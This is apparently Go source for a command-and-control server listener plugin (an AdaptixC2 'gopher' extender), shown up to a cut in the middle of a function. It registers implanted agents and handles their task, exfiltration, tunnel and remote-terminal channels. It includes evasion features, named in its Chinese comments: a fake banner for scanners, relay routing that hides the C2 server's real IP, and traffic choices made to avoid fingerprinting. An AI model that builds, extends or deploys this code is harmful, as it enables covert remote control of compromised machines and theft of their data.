package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/bits"
	"net"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

type Listener struct {
	transport *TransportTCP
}

type TransportTCP struct {
	AgentConnects Map
	JobConnects   Map
	Listener      net.Listener
	Config        TransportConfig
	Name          string
	Active        bool
}

// axSessionTickInterval 是**活着的会话**刷新 LastTick 的节流间隔。
//
// ★ 为什么需要它：gopher agent 是会话型（TsAgentCreate 传 Async=false），
//   INIT_PACK 之后它的 main loop 只剩一句阻塞的 RecvMsg —— **从不主动发帧**。
//   而 TsAgentSetTick 只在这三处被调用：TsAgentCreate、下发任务、tryDrainBeacon
//   命中。没有任务就没有第三种，于是 LastTick 冻结在创建时刻，
//   AdaptixWeb/src/utils.ts 的 isAgentOnline（阈值 max(60, sleep*2+40)）到点就
//   把一条 ESTABLISHED、进程还活着的会话画成离线 —— 这就是"上线不了"的全部。
//   旧注释假设"agent 每 20-45s 心跳一次"，对 Go agent 不成立，tryDrainBeacon 从
//   来没命中过。
// ★ 为什么用 isClientConnected 而不是让 agent 发心跳：对会话型 agent，
//   连接本身就是存活证据，下面每 100ms 一次的 MSG_PEEK 已经在证伪 FIN。
//   让 agent 定期发包反而是多余的线上流量（可被指纹化）。
// ★ 为什么是 20s：60s 窗口内留两次余量给抖动/调度；也远低于任何 DB 写压力阈值。
const axSessionTickInterval = 20 * time.Second

// StringOrArray accepts JSON string (Qt multi-line / profile) or []string (Web UI).
// Always stored/marshaled as a single string for gopher_agent profile.
type StringOrArray string

func (s *StringOrArray) UnmarshalJSON(data []byte) error {
	data = bytes.TrimSpace(data)
	if len(data) == 0 || string(data) == "null" {
		*s = ""
		return nil
	}
	switch data[0] {
	case '"':
		var str string
		if err := json.Unmarshal(data, &str); err != nil {
			return err
		}
		*s = StringOrArray(str)
		return nil
	case '[':
		var arr []string
		if err := json.Unmarshal(data, &arr); err != nil {
			return err
		}
		parts := make([]string, 0, len(arr))
		for _, a := range arr {
			a = strings.TrimSpace(a)
			if a != "" {
				parts = append(parts, a)
			}
		}
		*s = StringOrArray(strings.Join(parts, "\n"))
		return nil
	default:
		return fmt.Errorf("callback_addresses: expected string or array")
	}
}

func (s StringOrArray) MarshalJSON() ([]byte, error) {
	return json.Marshal(string(s))
}

type TransportConfig struct {
	HostBind           string        `json:"host_bind"`
	PortBind           int           `json:"port_bind"`
	Callback_addresses StringOrArray `json:"callback_addresses"`
	EncryptKey         string        `json:"encrypt_key"`

	Ssl        bool   `json:"ssl"`
	CaCert     []byte `json:"ca_cert"`
	ServerCert []byte `json:"server_cert"`
	ServerKey  []byte `json:"server_key"`
	ClientCert []byte `json:"client_cert"`
	ClientKey  []byte `json:"client_key"`

	TcpBanner   string `json:"tcp_banner"`
	ErrorAnswer string `json:"error_answer"`
	Timeout     int    `json:"timeout"`

	Protocol string `json:"protocol"`

	// ---- Phase5：libp2p 传输（实现见 pl_libp2p.go）----
	//
	// ★ 这些键名（l2p_*）必须与 teamserver 侧 gopher_agent/pl_main.go 的
	//   `case "libp2p":` 读的 listenerMap 键**逐字相同** —— 那边就是这么取的。
	//   GetProfile() 直接 Encode(t.Config)，所以本 struct 的 json tag 就是协议。
	Libp2pPeerID      string        `json:"l2p_peer_id"`
	Libp2pAddrs       StringOrArray `json:"l2p_addrs"`
	Libp2pProtocol    string        `json:"l2p_protocol"`
	Libp2pDialTimeout int           `json:"l2p_dial_timeout"`
	Libp2pPrivKey     string        `json:"l2p_privkey"`

	// ---- Phase5 批次5：经 circuit relay v2 隐藏 C2 真实 IP ----
	//
	// 每条是 **relay 自身** 的 multiaddr，必须带 /p2p/<relayPeerID>：
	//   /ip4/203.0.113.9/tcp/4001/p2p/12D3KooW...
	//
	// ★ 不要在这里写 /p2p-circuit —— 那一段由 listener 自己补
	//   （axLibp2pCircuitAddrs）。让 operator 手抄 52 字符的 peer id 已经是
	//   最容易错的一步，不要再让他拼路径。
	//
	// ★ 配了它 ⇒ agent profile 里的地址**自动换成 circuit 地址**，
	//   C2 的真实 IP 不出现在 agent 侧任何地方。
	Libp2pRelays StringOrArray `json:"l2p_relays"`
}

type Connection struct {
	conn         net.Conn
	ctx          context.Context
	handleCancel context.CancelFunc
}

const (
	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
	BOF_PACK      = 6
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	TunnelId  int    `msgpack:"tunnel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
	Reason    byte   `msgpack:"reason"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

// ─────────────────── D2：方向密钥派生（消除 two-time pad）───────────────────
//
// 缺陷：enc 与 dec 原先共用同一对 (key, iv) ⇒ AES-CTR 两个方向产生**同一段密钥流**：
//
//	C(server→agent) ⊕ C(agent→server) = P(server→agent) ⊕ P(agent→server)
//
// 即 two-time pad。终端会话里 s→a 是操作员键入、a→s 是 shell 回显，两者异或直接还原；
// 而 shell 提示符高度可预测 ⇒ 已知一侧明文即可解出另一侧。隧道同理。
//
// 修法：由同一 (key, iv) 用 HMAC-SHA256 作 KDF，派生出**两个计算上无关**的方向密钥。
//   ★ 为什么不是"给其中一个方向换个 iv"：CTR 下同 key、iv 仅差若干比特仍产生**相关**
//     密钥流，已知明文下可恢复；HMAC-SHA256 的输出没有这种结构。
//   ★ 为什么不动线格式：(key, iv) 仍原样走 initMsg ⇒ 协商格式零变化，两端各自本地派生。
//     但**两端必须同批上线** —— 只改一侧，该侧就解不出对侧（现象：隧道/终端一连就乱码）。
//
// ★★ 本函数在**两棵树里各有一份**，必须逐字节等价：
//      listener: extenders/gopher_listener_tcp/pl_transport.go
//      agent   : extenders/gopher_agent/src_gopher/tasks.go
//    标签改一个字、拼接顺序换一下，都会**静默**错位。
//
// ★★ 标签按**线路方向**命名，不按本地变量名 —— 两端的 enc/dec 与方向的对应是**相反**的：
//      server→agent : listener 用 encStream，agent 用 decStream
//      agent→server : listener 用 decStream，agent 用 encStream
//    按方向命名，是为了避开"照本地变量名对齐"这个几乎必然会犯的错。

const (
	axKeyLabelTunS2A  = "axc2/tunnel/s2a/v1"
	axKeyLabelTunA2S  = "axc2/tunnel/a2s/v1"
	axKeyLabelTermS2A = "axc2/terminal/s2a/v1"
	axKeyLabelTermA2S = "axc2/terminal/a2s/v1"
)

func axDirKey(key, iv []byte, label string) []byte {
	h := hmac.New(sha256.New, key)
	h.Write([]byte(label))
	h.Write(iv)
	return h.Sum(nil)
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	// ★ 与传输无关的两条检查先做（libp2p 与 TCP 共用），这样下面的传输相关校验可以
	//   在 libp2p 分支里整体短路 —— **不必复制任何一条检查**。复制出来的第二份必然
	//   与第一份漂移，而漂移的表现是静默放过非法 config（这一族问题本项目吃过多次）。
	//   ★ 记账：这两条从函数末尾移到了开头，只改变"多条同时出错时报哪一条"，
	//     不改变收/拒的结论。
	if conf.Timeout < 1 {
		return errors.New("Timeout must be greater than 0")
	}

	match, _ := regexp.MatchString("^[0-9a-f]{32}$", conf.EncryptKey)
	if len(conf.EncryptKey) != 32 || !match {
		return errors.New("encrypt_key must be 32 hex characters")
	}

	// ★ libp2p 的 callback_addresses 是 **multiaddr 列表**，不是 host:port ——
	//   下面 TCP 那段用 net.SplitHostPort 的校验对 /ip4/1.2.3.4/tcp/4444/p2p/12D3...
	//   必然误报 "cannot split host:port"，不分流的话 libp2p listener 根本建不起来。
	if conf.Protocol == "libp2p" {
		return axValidateLibp2pAddrs(string(conf.Callback_addresses))
	}

	if conf.HostBind == "" {
		return errors.New("HostBind is required")
	}

	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("PortBind must be in the range 1-65535")
	}

	cbRaw := strings.TrimSpace(string(conf.Callback_addresses))
	if cbRaw == "" {
		return errors.New("callback_servers is required")
	}
	// Accept newline / comma separated lists (Web array already joined with \n).
	lines := strings.FieldsFunc(cbRaw, func(r rune) bool {
		return r == '\n' || r == '\r' || r == ','
	})
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		host, portStr, err := net.SplitHostPort(line)
		if err != nil {
			return fmt.Errorf("Invalid address (cannot split host:port): %s\n", line)
		}

		port, err := strconv.Atoi(portStr)
		if err != nil || port < 1 || port > 65535 {
			return fmt.Errorf("Invalid port: %s\n", line)
		}

		ip := net.ParseIP(host)
		if ip == nil {
			if len(host) == 0 || len(host) > 253 {
				return fmt.Errorf("Invalid host: %s\n", line)
			}
			parts := strings.Split(host, ".")
			for _, part := range parts {
				if len(part) == 0 || len(part) > 63 {
					return fmt.Errorf("Invalid host: %s\n", line)
				}
			}
		}
	}

	return nil
}

func (t *TransportTCP) Start(ts Teamserver) error {
	var err error = nil
	address := fmt.Sprintf("%s:%d", t.Config.HostBind, t.Config.PortBind)

	// ★ libp2p：Start 的骨架（Accept 循环 / Active / sleep）与 TCP **完全相同**，
	//   唯一的不同是"谁产生 net.Listener"—— gostream.Listen 返回的正是 net.Listener。
	//   ★ 用 else if 而不是 goto：goto 会跨过下面的变量声明而编译失败。
	if t.Config.Protocol == "libp2p" {
		proto := t.Config.Libp2pProtocol
		if proto == "" {
			proto = axDefaultLibp2pProtocol
		}
		fmt.Printf("  Started libp2p listener '%s': %s:%d (protocol %s)\n",
			t.Name, t.Config.HostBind, t.Config.PortBind, proto)
		t.Listener, err = axListenLibp2p(t.Config)
		if err != nil {
			return err
		}
	} else if t.Config.Ssl {
		fmt.Printf("  Started mTLS listener '%s': %s\n", t.Name, address)
		cert, err := tls.X509KeyPair(t.Config.ServerCert, t.Config.ServerKey)
		if err != nil {
			return err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(t.Config.CaCert)
		config := &tls.Config{
			Certificates: []tls.Certificate{cert},
			ClientAuth:   tls.RequireAndVerifyClientCert, // Require client verification
			ClientCAs:    caCertPool,
		}

		t.Listener, err = tls.Listen("tcp", address, config)
		if err != nil {
			return err
		}

	} else {
		fmt.Printf("  Started TCP listener '%s': %s\n", t.Name, address)
		t.Listener, err = net.Listen("tcp", address)
		if err != nil {
			return err
		}
	}

	go func() {
		for {
			conn, err := t.Listener.Accept()
			if err != nil {
				return
			}
			go t.handleConnection(conn, ts)
		}
	}()
	t.Active = true

	time.Sleep(500 * time.Millisecond)
	return err
}

func (t *TransportTCP) handleConnection(conn net.Conn, ts Teamserver) {
	// ★ libp2p（gostream）没有 SyscallConn/MSG_PEEK ⇒ 在此包一层可窥视读缓冲。
	//   TCP 路径**一字节都不执行**这里（Protocol 不是 libp2p 就直接跳过）
	//   ⇒ 对现役 TCP listener 是零行为变更。
	if t.Config.Protocol == "libp2p" {
		conn = axWrapConn(conn)
	}

	var (
		sendData []byte
		recvData []byte
		encKey   []byte
		err      error
		initMsg  StartMsg
	)

	// ★ banner 只对**裸 TCP / TLS** 有意义：那是给扫描器看的伪装页，由对端按 BannerSize
	//   主动读掉。libp2p 分支（agent 侧 transport_libp2p.go）**既不设也不读** BannerSize
	//   ⇒ 这里写出去的 banner 会被 agent 当成 4 字节长度头 ⇒ **帧错位**，
	//   而错位后解析出的"长度"又直接落进 recvMsg 的分配路径。（审计 C-F9）
	if t.Config.Protocol != "libp2p" && len(t.Config.TcpBanner) > 0 {
		_, _ = conn.Write([]byte(t.Config.TcpBanner))
	}

	connection := Connection{
		conn: conn,
	}
	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())

	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	recvData, err = recvMsg(conn)
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		goto ERR
	}

	encKey, err = hex.DecodeString(t.Config.EncryptKey)
	if err != nil {
		goto ERR
	}
	recvData, err = DecryptData(recvData, encKey)
	if err != nil {
		goto ERR
	}

	err = msgpack.Unmarshal(recvData, &initMsg)
	if err != nil {
		goto ERR
	}

	switch initMsg.Type {

	case INIT_PACK:

		var initPack InitPack
		err := msgpack.Unmarshal(initMsg.Data, &initPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", initPack.Id)
		agentType := fmt.Sprintf("%08x", initPack.Type)
		ExternalIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

		if !Ts.TsAgentIsExists(agentId) {
			_, err = Ts.TsAgentCreate(agentType, agentId, initPack.Data, t.Name, ExternalIP, false)
			if err != nil {
				goto ERR
			}
		} else {
			emptyMark := ""
			_ = Ts.TsAgentUpdateDataPartial(agentId, struct {
				Mark     *string `json:"mark"`
				Listener *string `json:"listener"`
			}{Mark: &emptyMark, Listener: &t.Name})
		}

		t.AgentConnects.Put(agentId, connection)

		// lastSessionTick 只属于本连接（见 axSessionTickInterval）。
		lastSessionTick := time.Now()

		for {
			sendData, err = Ts.TsAgentGetHostedTasks(agentId, 0x1900000)
			if err != nil {
				break
			}

			if sendData != nil && len(sendData) > 0 {
				err = sendMsg(conn, sendData)
				if err != nil {
					break
				}

				recvData, err = recvMsg(conn)
				if err != nil {
					break
				}

				_ = Ts.TsAgentSetTick(agentId, t.Name)

				_ = Ts.TsAgentProcessData(agentId, recvData)
			} else {
				if !isClientConnected(conn, t.Config.Ssl) {
					break
				}
				// Drain fully-buffered agent beacons. Read only (never answer):
				// an empty reply would start an infinite ping-pong with the
				// agent's got_msg logic.
				//
				// ★ 注意：Go gopher agent 并不主动心跳（见 axSessionTickInterval），
				//   所以这条分支正常路径下永远读不到东西 —— 它防的是 C agent /
				//   将来加了心跳的 agent，以及任务下发与空闲之间的竞态窗口。
				if err := t.tryDrainBeacon(conn, agentId, ts); err != nil {
					if errors.Is(err, io.EOF) {
						break
					}
					break
				}
				// 会话存活 ⇒ 刷新 LastTick，否则空闲 60s 后 UI 判离线。
				// 必须先确认 AgentConnects 里当前登记的仍是**本条**连接：agent 重连
				// 时新连接会覆盖 map，旧 goroutine 若继续 tick，会让一条已经断掉的
				// 会话把心跳续在别人身上。
				if time.Since(lastSessionTick) >= axSessionTickInterval {
					cur, ok := t.AgentConnects.Get(agentId)
					if !ok {
						break
					}
					c, ok := cur.(Connection)
					if !ok || c.conn != conn {
						break
					}
					lastSessionTick = time.Now()
					_ = Ts.TsAgentSetTick(agentId, t.Name)
				}
				// Idle poll throttle: MSG_PEEK is non-blocking, so without a
				// sleep this branch spins at 100% CPU with an allocation per
				// iteration (GC churn). 100ms keeps disconnect detection fast
				// while cutting idle CPU by ~1000x.
				time.Sleep(100 * time.Millisecond)
			}
		}

		disconnectMark := "Disconnect"
		_ = ts.TsAgentUpdateDataPartial(agentId, struct {
			Mark *string `json:"mark"`
		}{Mark: &disconnectMark})
		t.AgentConnects.Delete(agentId)
		_ = conn.Close()

	case EXFIL_PACK:

		var exfilPack ExfilPack
		err := msgpack.Unmarshal(initMsg.Data, &exfilPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", exfilPack.Id)

		if !Ts.TsTaskRunningExists(agentId, exfilPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + exfilPack.Task

		t.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(conn)
			if err != nil {
				break
			}
			_ = Ts.TsAgentProcessData(agentId, recvData)
		}

		t.JobConnects.Delete(jcId)
		_ = conn.Close()

	case JOB_PACK, BOF_PACK:

		var jobPack JobPack
		err := msgpack.Unmarshal(initMsg.Data, &jobPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", jobPack.Id)

		if !Ts.TsTaskRunningExists(agentId, jobPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + jobPack.Task

		t.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(conn)
			if err != nil {
				break
			}
			_ = Ts.TsAgentProcessData(agentId, recvData)
		}

		t.JobConnects.Delete(jcId)
		_ = conn.Close()

	case TUNNEL_PACK:

		var tunPack TunnelPack
		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", tunPack.Id)

		if !Ts.TsTunnelChannelExists(tunPack.ChannelId) {
			// ★ 批次9b：反向 rportfwd 的通道由 **agent 自己** accept（channelId 也由
			//   agent 分配），teamserver 事先不可能知道 ⇒ 正向那条「先注册后使用」
			//   的时序在反向不成立。这里把「登记」折进 TUNNEL_PACK 自身。
			//   ★ fail-closed：TunnelId == 0（正向包）维持原样直接 goto ERR；
			//     建完**复检**，不过照样 goto ERR（目标不可达时 core 会 Close 掉通道）。
			if tunPack.TunnelId == 0 {
				goto ERR
			}
			// ★ 批次9d：AcceptDirect（core 只拨号+登记，**不启 relay**）。
			//   本 listener 下面用 Resume(..., true) 接管 prSrv；core 若在这里多启一个
			//   relay，就会与本插件抢读同一条 io.Pipe。详见 core 侧该方法的注释。
			Ts.TsTunnelConnectionAcceptDirect(tunPack.TunnelId, tunPack.ChannelId)
			if !Ts.TsTunnelChannelExists(tunPack.ChannelId) {
				goto ERR
			}
		}

		if !tunPack.Alive {
			if tunPack.Reason < 1 || tunPack.Reason > 8 {
				tunPack.Reason = 5
			}
			ts.TsTunnelConnectionHalt(tunPack.ChannelId, tunPack.Reason)
			_ = conn.Close()
			return
		}

		// ★ 批次9d：这里**不再需要** pause 补丁 —— 反向通道上的 G2 已从源头不存在
		//   （agent 插件走 AcceptDirect）。Resume(..., true) ⇒ relaySocketToTunnel(direct=true)
		//   ⇒ 只启 G1（target → pwSrv），prSrv 的读取端由本插件独占。
		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, true)

		pr, pw, err := Ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
		if err != nil {
			goto ERR
		}

		// ★ 原先 `blockEnc, _ := aes.NewCipher(...)` 丢弃 error：非法长度返回 nil block，
		//   紧接着 `cipher.NewCTR(nil, iv)` 会 **panic 打死整个 teamserver**
		//   （连接处理 goroutine 里，插件内零 recover ⇒ 进程直接退出）。iv 长度不对同理。
		//   tunPack.* 来自**已认证**的 agent，但认证 ≠ 可信：一个被拿下或被伪造的
		//   agent 就能用它打死服务端。（审计 S3）
		blockEnc, err := aes.NewCipher(axDirKey(tunPack.Key, tunPack.Iv, axKeyLabelTunS2A))
		if err != nil {
			goto ERR
		}
		if len(tunPack.Iv) != aes.BlockSize {
			goto ERR
		}
		encStream := cipher.NewCTR(blockEnc, tunPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: conn}

		decCipher, err := aes.NewCipher(axDirKey(tunPack.Key, tunPack.Iv, axKeyLabelTunA2S))
		if err != nil {
			goto ERR
		}
		decStream := cipher.NewCTR(decCipher, tunPack.Iv)
		decReader := &cipher.StreamReader{S: decStream, R: conn}

		_ = pw.Close()

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = conn.Close()
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			_, _ = io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			buf := make([]byte, 0x8000)
			for {
				n, err := decReader.Read(buf)
				if n > 0 {
					data := make([]byte, n)
					copy(data, buf[:n])
					ts.TsTunnelConnectionData(tunPack.ChannelId, data)
				}
				if err != nil {
					break
				}
			}
			closeAll()
		}()

		wg.Wait()

		ts.TsTunnelConnectionClose(tunPack.ChannelId, false)

	case TERMINAL_PACK:

		var termPack TermPack
		err := msgpack.Unmarshal(initMsg.Data, &termPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", termPack.Id)
		terminalId := fmt.Sprintf("%08x", termPack.TermId)

		if !Ts.TsTerminalConnExists(terminalId) {
			goto ERR
		}

		if !termPack.Alive {
			_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
			_ = conn.Close()
			return
		}

		ts.TsTerminalConnResume(agentId, terminalId, true)

		pr, pw, err := Ts.TsTerminalGetPipe(agentId, terminalId)
		if err != nil {
			goto ERR
		}

		// ★ 同 TUNNEL 分支：丢弃 aes.NewCipher 的 error ⇒ nil block ⇒
		//   `cipher.NewCTR(nil, iv)` panic 打死 teamserver。（审计 S3）
		blockEnc, err := aes.NewCipher(axDirKey(termPack.Key, termPack.Iv, axKeyLabelTermS2A))
		if err != nil {
			goto ERR
		}
		if len(termPack.Iv) != aes.BlockSize {
			goto ERR
		}
		encStream := cipher.NewCTR(blockEnc, termPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: conn}

		blockDec, err := aes.NewCipher(axDirKey(termPack.Key, termPack.Iv, axKeyLabelTermA2S))
		if err != nil {
			goto ERR
		}
		decStream := cipher.NewCTR(blockDec, termPack.Iv)
		decWriter := &cipher.StreamWriter{S: decStream, W: pw}

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = conn.Close()
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			_, _ = io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			_, _ = io.Copy(decWriter, conn)
			closeAll()
		}()

		wg.Wait()

		_ = ts.TsAgentTerminalCloseChannel(terminalId, "killed")
	}

	return

ERR:
	_ = sendMsg(conn, []byte(t.Config.ErrorAnswer))
	_ = conn.Close()
}

func (t *TransportTCP) Stop() error {
	var (
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + t.Name
	)

	if t.Listener != nil {
		_ = t.Listener.Close()
	}

	t.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, _ := valueConn.(Connection)
		if connection.conn != nil {
			connection.handleCancel()
			_ = connection.conn.Close()
		}
		return true
	})

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return nil
}

func (t *TransportTCP) bannerError(conn net.Conn) {
	_, _ = conn.Write([]byte(t.Config.ErrorAnswer))
	_ = conn.Close()
}

func connRead(conn net.Conn, size int) ([]byte, error) {
	if size <= 0 {
		return nil, fmt.Errorf("incorrected size: %d", size)
	}

	// ★ libp2p：消费**必须**走包装里的 reader。若绕过它直接从 conn 读，缓冲里已预读
	//   的字节会被跳过 ⇒ 帧错位。全文件只有 4 处 connRead 调用点，所以"所有消费都
	//   经过这里"是**可证的**——这是整个包装方案成立的支点。
	if br := axReaderOf(conn); br != nil {
		return axReadBuffered(br, size)
	}

	// ★ 不按 size 预分配：`make([]byte, 0, size)` 会**立即分配并清零** cap 字节，
	//   于是一个伪造的长度头就等于一次同尺寸的内存申请。recvMsg 已加上界，
	//   这里再按 64 KiB 封顶做纵深防御 —— 下面是 1024 字节一段的 append 循环，
	//   预分配大小对吞吐没有实质影响。（审计 C-F1）
	capHint := size
	if capHint > 64*1024 {
		capHint = 64 * 1024
	}
	message := make([]byte, 0, capHint)
	tmpBuff := make([]byte, 1024)
	readSize := 0

	for readSize < size {
		toRead := size - readSize
		if toRead < len(tmpBuff) {
			tmpBuff = tmpBuff[:toRead]
		}

		n, err := conn.Read(tmpBuff)
		if err != nil {
			return nil, err
		}

		message = append(message, tmpBuff[:n]...)
		readSize += n
	}
	return message, nil
}

// maxFrameLen 是单个 C2 帧的长度上界（25 MiB）。
//
// ★★ 必须被 recvMsg 与 tryDrainBeacon **共用**：两处都在**未认证**阶段读 4 字节长度头。
// 少了这条判据，`ff ff ff ff` 会让 connRead 走 `make([]byte, 0, 4294967295)` ——
// Go 的 makeslice 失败是 `runtime: out of memory`，属 **fatal，recover 拦不住**，
// 直接打死整个 teamserver；即使侥幸成功，慢速攻击（只发头不发送体）也能让每条连接
// 长期占住 4 GiB。recvMsg 的调用点在 handleConnection 的**第一个 5s 窗口**里，
// 早于 DecryptData ⇒ **不需要任何凭据、不需要 UI 操作**。
// （审计 C-F1；tryDrainBeacon 早就写了同一条，recvMsg 没有。）
const maxFrameLen = 0x1900000

func recvMsg(conn net.Conn) ([]byte, error) {
	bufLen, err := connRead(conn, 4)
	if err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(bufLen)

	if msgLen == 0 || msgLen > maxFrameLen {
		return nil, fmt.Errorf("recvMsg: frame length %d out of range (1..%d)", msgLen, maxFrameLen)
	}

	return connRead(conn, int(msgLen))
}

func sendMsg(conn net.Conn, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, err := conn.Write(message)
	return err
}

// axPeekAlive 对底层 TCP 做一次**不消费任何字节**的存活探测（MSG_PEEK | MSG_DONTWAIT）。
// 抽成函数是为了让 TLS 分支也能用 —— 它原先自己做了一次 conn.Read（见 isClientConnected）。
func axPeekAlive(tcpConn *net.TCPConn) bool {
	rawConn, serr := tcpConn.SyscallConn()
	if serr != nil {
		return true
	}
	alive := true
	_ = rawConn.Read(func(fd uintptr) bool {
		buf := make([]byte, 1)
		n, _, rerr := syscall.Recvfrom(int(fd), buf, syscall.MSG_PEEK|syscall.MSG_DONTWAIT)
		if n == 0 && rerr == nil {
			alive = false // peer sent FIN
		} else if rerr != nil && rerr != syscall.EAGAIN && rerr != syscall.EWOULDBLOCK {
			alive = false
		}
		return true
	})
	return alive
}

func isClientConnected(conn net.Conn, ssl bool) bool {
	// ★★ libp2p 必须在**所有断言之前**判定（审计 C-F8）。
	//   gostream 流不是 *tls.Conn；落到下面 `if ssl` 里的断言会 return false
	//   ⇒ protocol=libp2p 且 ssl=true 时，会话在**首次空闲迭代**就被判死
	//   （ax_config.axs 的协议下拉框与 mTLS 勾选框互相独立、Create 不互斥，这个组合可达）。
	//   同一个陷阱在 plain 分支末尾也有一份（`if !ok { return false }`）—— 作者已经
	//   识别并写下了警告注释，却把它留在了紧邻 TLS 分支的**上方 16 行**。
	if br := axReaderOf(conn); br != nil {
		return axProbeBuffered(br, conn)
	}

	if ssl {
		tcpConn, ok := conn.(*tls.Conn)
		if !ok {
			return false
		}
		// ★★ 这里原先是 `buf := make([]byte, 1); conn.Read(buf)` —— **真的消费 1 字节**。
		//   而 TLS 之下的第一个字节正是 4 字节长度头的第 1 字节 ⇒ 有数据在途时必然
		//   帧错位（plain 分支的注释警告的正是这件事，它用 MSG_PEEK 避开了，这里没有）。
		//   旧树同一函数逐字相同 ⇒ 继承自改造前，非本次引入（审计 C-F11）。
		//   改成窥视**底层 TCP**：NetConn() 给的是密文流，但"对端是否发了 FIN"
		//   这个判据等价，且一个字节都不消费、也不再白等 100ms。
		under := tcpConn.NetConn()
		if under == nil {
			return true
		}
		if tcpUnder, ok2 := under.(*net.TCPConn); ok2 {
			return axPeekAlive(tcpUnder)
		}
		return true
	}

	// Plain TCP: MSG_PEEK liveness probe — MUST NOT consume bytes.
	// Consuming here corrupts the 4-byte length framing for the next
	// recvMsg (partial beacons were previously nibbled 1 byte at a time).
	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return false
	}
	return axPeekAlive(tcpConn)
}

// drainPeekLimit: frames up to this size are fully pre-flighted with
// MSG_PEEK before consumption (guaranteed non-destructive). Larger frames
// (bulk downloads etc.) use a deadline-gated read instead.
const drainPeekLimit = 256 * 1024

// tryDrainBeacon reads and processes one complete agent message IF it is
// already fully buffered. Uses MSG_PEEK to check both the 4-byte length
// header and the whole frame before consuming anything — a partial frame
// is never touched, which keeps the length framing intact. Returns io.EOF
// when the peer has closed the connection.
func (t *TransportTCP) tryDrainBeacon(conn net.Conn, agentId string, ts Teamserver) error {
	// ★ libp2p：无 MSG_PEEK ⇒ 用 bufio.Peek 预检整帧。三态语义与下面的 TCP 段逐条
	//   对应，消费动作收敛到 consumeFrame（**两条路径共用同一份实现**，见其注释）。
	//   ★★ 必须在这里返回：落到下面那句 `return nil` 的话，信标永远读不掉 ⇒ 流缓冲
	//   填满 ⇒ tick 过期 ⇒ UI 显示离线 —— 这是本改造要修的核心缺陷之二。
	if br := axReaderOf(conn); br != nil {
		msgLen, perr := axPeekFrame(br, conn, axConnBufSize-4)
		if perr != nil {
			return perr
		}
		if msgLen == 0 {
			return nil
		}
		return t.consumeFrame(conn, agentId, ts, msgLen)
	}

	tcpConn, ok := conn.(*net.TCPConn)
	if !ok {
		return nil
	}
	rawConn, serr := tcpConn.SyscallConn()
	if serr != nil {
		return nil
	}

	var hdr [4]byte
	hdrN := 0
	var peekErr error
	_ = rawConn.Read(func(fd uintptr) bool {
